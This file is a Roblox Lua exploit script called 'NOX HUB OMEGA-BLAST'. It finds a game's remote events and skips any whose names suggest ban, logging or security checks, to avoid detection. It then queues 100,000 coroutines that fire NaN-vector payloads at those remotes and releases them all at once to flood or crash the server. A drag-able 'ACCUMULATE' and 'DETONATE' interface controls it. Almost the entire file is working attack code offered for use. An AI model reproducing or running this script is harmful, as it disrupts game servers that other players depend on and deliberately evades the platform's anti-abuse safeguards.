--[[
    🔱 NOX HUB v21.0 [OMEGA-BLAST] 🔱
    "I am ready. Are you?"
    
    OMEGA FEATURES:
    - [HYPER-ACCUMULATION] : Pre-allocates 100,000 attack threads in memory.
    - [SILENT CHARGE] : Generates potential kinetic energy without sending a single packet.
    - [INSTANT RELEASE] : Resumes all threads in a single tick. 
    - [ANTI-BAN FILTER] : Strict banning of known honeypots to prevent early detection.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- // 1. OMEGA ENGINE //
local Engine = {
    Charging = false,
    Targets = {},
    Warheads = {} -- Stores the suspended coroutines
}

function Engine:Scan()
    Engine.Targets = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- ULTRA STRICT FILTER (You got banned, we must be careful)
            if not (n:find("ban") or n:find("kick") or n:find("log") or n:find("admin") or n:find("check") or n:find("security")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Prepare(updateCallback)
    if Engine.Charging then return end
    Engine.Charging = true
    Engine.Warheads = {}
    
    Engine:Scan()
    if #Engine.Targets == 0 then
        updateCallback(0, "NO TARGETS.")
        Engine.Charging = false
        return
    end
    
    -- CONFIG: 100,000 THREADS requested by user
    local TotalWarheads = 100000 
    local Payload = table.create(100, Vector3.new(0/0, 0/0, 0/0)) -- The reliable NaN payload
    
    -- GENERATION LOOP
    task.spawn(function()
        for i = 1, TotalWarheads do
            -- Create a thread that is READY to fire the moment it wakes up
            local target = Engine.Targets[(i % #Engine.Targets) + 1]
            
            local co = coroutine.create(function()
                pcall(function()
                    if target:IsA("RemoteEvent") then
                        target:FireServer(Payload)
                    else
                        target:InvokeServer(Payload)
                    end
                end)
            end)
            
            table.insert(Engine.Warheads, co)
            
            -- UI Feedback & Anti-Freeze Yield
            if i % 1000 == 0 then
                updateCallback(i / TotalWarheads, "ACCUMULATING: " .. i)
                RunService.Heartbeat:Wait()
            end
        end
        
        updateCallback(1, "OMEGA READY: " .. #Engine.Warheads .. " WARHEADS")
        game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="CHARGE COMPLETE. WAITING FOR TRIGGER."})
    end)
end

function Engine:Detonate(updateCallback)
    if #Engine.Warheads == 0 then return end
    
    updateCallback(1, "DETONATING...")
    local blastCount = 0
    
    -- THE BIG BANG
    -- We try to resume as many as possible as fast as possible
    for _, co in ipairs(Engine.Warheads) do
        coroutine.resume(co)
        blastCount = blastCount + 1
    end
    
    Engine.Warheads = {} -- Clear tubes
    Engine.Charging = false
    
    updateCallback(0, "BLAST COMPLETE: " .. blastCount .. " HITS")
end

-- // 2. OMEGA UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxOmega"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 500, 0, 300)
    Main.Position = UDim2.new(0.5, -250, 0.5, -150)
    Main.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
    Main.BorderSizePixel = 0
    
    local Gradient = Instance.new("UIGradient", Main)
    Gradient.Color = ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
    }
    Gradient.Rotation = 45
    
    local Stroke = Instance.new("UIStroke", Main)
    Stroke.Color = Color3.fromRGB(255, 50, 0)
    Stroke.Thickness = 2
    
    -- HEADER
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // OMEGA BLAST v21.0"
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(255, 50, 0)
    Title.TextSize = 24
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.BackgroundTransparency = 1
    
    -- PROGRESS RING
    local RingBg = Instance.new("ImageLabel", Main)
    RingBg.Size = UDim2.new(0, 150, 0, 150)
    RingBg.Position = UDim2.new(0.5, -75, 0.4, 0) -- Centered
    RingBg.Image = "rbxassetid://3570695787" -- Circle
    RingBg.ImageColor3 = Color3.fromRGB(50, 10, 10)
    RingBg.BackgroundTransparency = 1
    
    local RingFill = Instance.new("ImageLabel", RingBg)
    RingFill.Size = UDim2.new(1, 0, 1, 0)
    RingFill.Image = "rbxassetid://3570695787"
    RingFill.ImageColor3 = Color3.fromRGB(255, 50, 0)
    RingFill.BackgroundTransparency = 1
    RingFill.ImageTransparency = 0.5
    
    local Counter = Instance.new("TextLabel", RingBg)
    Counter.Size = UDim2.new(1, 0, 1, 0)
    Counter.BackgroundTransparency = 1
    Counter.Text = "0%"
    Counter.TextColor3 = Color3.fromRGB(255, 255, 255)
    Counter.Font = Enum.Font.GothamBlack
    Counter.TextSize = 24
    
    -- STATUS TEXT
    local Status = Instance.new("TextLabel", Main)
    Status.Text = "SYSTEM IDLE"
    Status.Size = UDim2.new(1, 0, 0, 20)
    Status.Position = UDim2.new(0, 0, 0.25, 0)
    Status.TextColor3 = Color3.fromRGB(200, 200, 200)
    Status.BackgroundTransparency = 1
    Status.Font = Enum.Font.Code
    
    -- BUTTONS
    local BtnCharge = Instance.new("TextButton", Main)
    BtnCharge.Size = UDim2.new(0.4, 0, 0.15, 0)
    BtnCharge.Position = UDim2.new(0.05, 0, 0.8, 0)
    BtnCharge.BackgroundColor3 = Color3.fromRGB(50, 10, 10)
    BtnCharge.Text = "ACCUMULATE (100k)"
    BtnCharge.TextColor3 = Color3.fromRGB(255, 200, 200)
    BtnCharge.Font = Enum.Font.GothamBold
    BtnCharge.TextSize = 14
    
    local BtnBlast = Instance.new("TextButton", Main)
    BtnBlast.Size = UDim2.new(0.4, 0, 0.15, 0)
    BtnBlast.Position = UDim2.new(0.55, 0, 0.8, 0)
    BtnBlast.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- Disabled initially
    BtnBlast.Text = "DETONATE"
    BtnBlast.TextColor3 = Color3.fromRGB(100, 100, 100)
    BtnBlast.Font = Enum.Font.GothamBold
    BtnBlast.TextSize = 14
    BtnBlast.AutoButtonColor = false
    
    -- LOGIC HOOKS
    BtnCharge.MouseButton1Click:Connect(function()
        if not Engine.Charging and #Engine.Warheads == 0 then
            Engine:Prepare(function(prog, txt)
                Status.Text = txt
                Counter.Text = math.floor(prog * 100) .. "%"
                -- Simple fill logic (ClipDescendants would be better but simple image alpha works for feedback)
                RingFill.ImageTransparency = 1 - prog
                
                if prog == 1 then
                    BtnBlast.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                    BtnBlast.TextColor3 = Color3.fromRGB(255, 255, 255)
                    BtnBlast.AutoButtonColor = true
                    -- Pulse Animation
                    game:GetService("TweenService"):Create(BtnBlast, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, -1, true), {BackgroundColor3 = Color3.fromRGB(150, 0, 0)}):Play()
                end
            end)
        end
    end)
    
    BtnBlast.MouseButton1Click:Connect(function()
        if #Engine.Warheads > 0 then
            Engine:Detonate(function(prog, txt)
                 Status.Text = txt
                 Counter.Text = "0%"
                 RingFill.ImageTransparency = 1
                 BtnBlast.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
                 BtnBlast.TextColor3 = Color3.fromRGB(100, 100, 100)
            end)
        end
    end)
    
    -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
